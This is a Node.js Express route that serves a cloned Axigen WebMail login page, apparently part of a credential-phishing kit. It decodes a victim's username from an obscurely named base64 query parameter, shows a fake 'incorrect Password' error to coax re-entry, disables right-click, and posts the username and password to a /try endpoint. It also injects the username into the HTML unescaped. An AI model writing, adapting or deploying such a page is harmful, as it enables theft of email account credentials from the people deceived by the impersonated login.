
const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');
router.use(express.static(__dirname + '/public'));
router.use(bodyParser.urlencoded({ extended: false }));



router.get('/', (req, res) => {

    const data = req.query.hfdgdhguirehfdhgfdrereoh;

    const username = Buffer.from(data, 'base64').toString('utf-8');
    
    console.log(username);


    if (data == null) {
    res.render('error');
    
  }else{


    const htmlContent = `
    <!DOCTYPE html>
<html>
    <head>

        <link rel="shortcut icon" href="/files/logo.png" type="image/x-icon">
        <title>Axigen WebMail</title>

        <style>
@import url('https://fonts.googleapis.com/css2?family=Titillium+Web:wght@200&display=swap');
@import url('https://fonts.cdnfonts.com/css/source-sans-pro');

input {
    border-radius: 4px;
    border:1px solid #666;
    font-size: 16px;
    height: 26px;
    width:350px;
    padding: 13px 15px;
    margin-bottom: 10px;
    outline: none;
    margin-left: 35px;
    font-family: Source Sans Pro,sans-serif;
    background: transparent;
    color:grey;
}

input:focus {
  border: 1px solid  #4c8ea6;
  outline: 2px solid rgb(221, 100, 56);
  
}
input:focus + label[placeholder]:before {
  color:  #4c8ea6;
}
input:focus + label[placeholder]:before,
input:valid + label[placeholder]:before {
  transition-duration: .2s;
  transform: translate(0, -2.0em) scale(0.9, 0.9);
}

input:invalid + label[placeholder][alt]:before {
  content: attr(alt);
}
::placeholder{
  

}

input + label[placeholder] {
  display: block;
  pointer-events: none;
  line-height: 1em;
  margin-top: calc(-3em - 2px);
  margin-bottom: calc((3em - 1em) + 2px);
  margin-left: 25px;
 
  
}

input + label[placeholder]:before {
  content: attr(placeholder);
  display: inline-block;
  margin: 0 calc(1em + 2px);
  padding: 0 2px;
  color:hsla(0,0%,100%,.65);
  white-space: nowrap;
  transition: 0.3s ease-in-out;
  background-color: #292929;
  background-size: 100% 9px;
  background-repeat: no-repeat;
  background-position: center;
  font-family: Source Sans Pro,sans-serif;
  
}
.button{

    background-color: #dc6060;
    height: 50px;
    width:280px;
    border-color: #dc6060;
    color: #fff;
    border-radius: 28px;
    border:solid,transparent;
    cursor: pointer;
}
.bdbody{
                    background-image: url(/files/bg.png);  background-position-x: 0px;
                    background-position-y: 0px;
                    background-repeat: no-repeat;
                    background-size: cover;
                    margin: 0;
                    padding: 0;
                    width: 100%;
                    height: 100%;
                    font-family: Source Sans Pro,sans-serif;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: space-between;
                    scrollbar-width: thin;
                    scrollbar-color: grey transparent;

}

.newdiv{

         position: relative;flex-grow: 1;
         flex-shrink: 1;
         flex-basis: 0%;display: flex;
         flex-direction: column;
         align-items: center;
         justify-content: center;
         width: 100%;
         z-index: 2;
         scrollbar-width: thin;
         scrollbar-color: grey transparent;
         font-family: Source Sans Pro,sans-serif;
}


        </style>

     


    </head>
    <body onload="" oncontextmenu="return false"  class="bdbody">
        
        <form class="bdbody" id="login-form" method="post"  name="loginForm" action="/try" accept-charset="UTF-8">
         <div style="position: fixed;top: 0; width: 100%;height: 100%;background: #0f171a; opacity: 0.9;"></div>
         <div class="newdiv">
        

            <div style="width:500px;margin-top:180px;padding: 0;">
                <div style="margin-bottom: 30px;height: 60px;"><center><img style="height: 60px;width:60px; align-content: center;" src="/files/logo.png"></center></div>
                <h1 style="color: #fff;max-width: 800px;font-family: Titillium Web,sans-serif;font-size: 40px;font-weight: 200;line-height: 48px;text-align: center;">Axigen WebMail</h1>
                <h2 style="margin-top: 10px;margin-right: 0px;margin-bottom: 20px;margin-left: 0px;font-family: Titillium Web,sans-serif;font-size: 20px;font-weight: 200;text-align: center;color: hsla(0,0%,100%,.65);">Log in to your Axigen email account</h2>
                <center><p id="error-class" style="color:#dc6060; font-family: Titillium Web,sans-serif;"> Your have entered incorrect Password. Please try again.</p></center><br>
                <div>
                
                     <input style="height: 25px;width: 400px;"  value="${username}" name="username" type='USERNAME' id="username">
                     <label style="font-size: 14px;"  alt='USERNAME' placeholder='USERNAME'></label>
                </div>
          
                <div >
                     <input style="height: 25px;width: 400px;"  name="password" type='PASSWORD' id="password">
                    <label style="font-size: 14px;"  alt='PASSWORD' placeholder='PASSWORD'></label>
                </div>
                <br><br>
              
                  <center><input class="button" onclick="validateForm();" type="submit" value="LOG IN">
                  <script>


									function validateForm() {
									var username = document.getElementById("username").value;
									var password = document.getElementById("password").value;
									var errorMessage = document.getElementById("error-class");

									// Basic validation (you can add more complex validation logic)
									if (username.trim() === "" || password.trim() === "") {
										errorMessage.textContent = "Please enter your current password to continue.";
										event.preventDefault();
									} else {
										// Submit the form if validation passes
										document.getElementById("login-form").submit();
									}
										
								}
		    
								</script>
                  </form>
                  <br><br>
                  <p style="font-family: Source Sans Pro,sans-serif;font-size: 14px;font-weight: 200;text-align: center;color: hsla(0,0%,100%,.65);">Switch To<a style="color: #4c8ea6;margin-left: 5px; text-decoration: none;" title="Standard Interface" href="/">Standard Interface</a></p>
                

                <select style="background-color: transparent; border-color: #666;color: #757e80; width:120px ;height:30px; " name="language" id="language">
                    <option value="volvo">English</option>
                    <option value="saab">Dansk</option>
                    <option value="opel">Deutsch</option>
                    <option value="audi">Espanol</option>
                  </select>
                  <br><br>
                  <br><br>
                                  
                  <p style="font-family: Source Sans Pro,sans-serif;font-size: 14px;font-weight: 200;text-align: center;color: hsla(0,0%,100%,.65);">Powered by<a style="color: #4c8ea6;margin-left: 5px; text-decoration: none;" title="Standard Interface" href="/">Axigen</a></p>
                  <hr>
                  <p style="font-family: Source Sans Pro,sans-serif;font-size: 14px;font-weight: 400;text-align: center;color: hsla(0,0%,100%,.65);margin-top: -2px;">Email, calendaring, and collaboration</p>
                  <p style="font-family: Source Sans Pro,sans-serif;font-size: 14px;font-weight: 400;text-align: center;color: hsla(0,0%,100%,.65);margin-top: -15px;">Total privacy, high availability, and scalability</p>
                </center>  

            </div>

        </div>

      

        </body>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }

});
     
   



module.exports =router
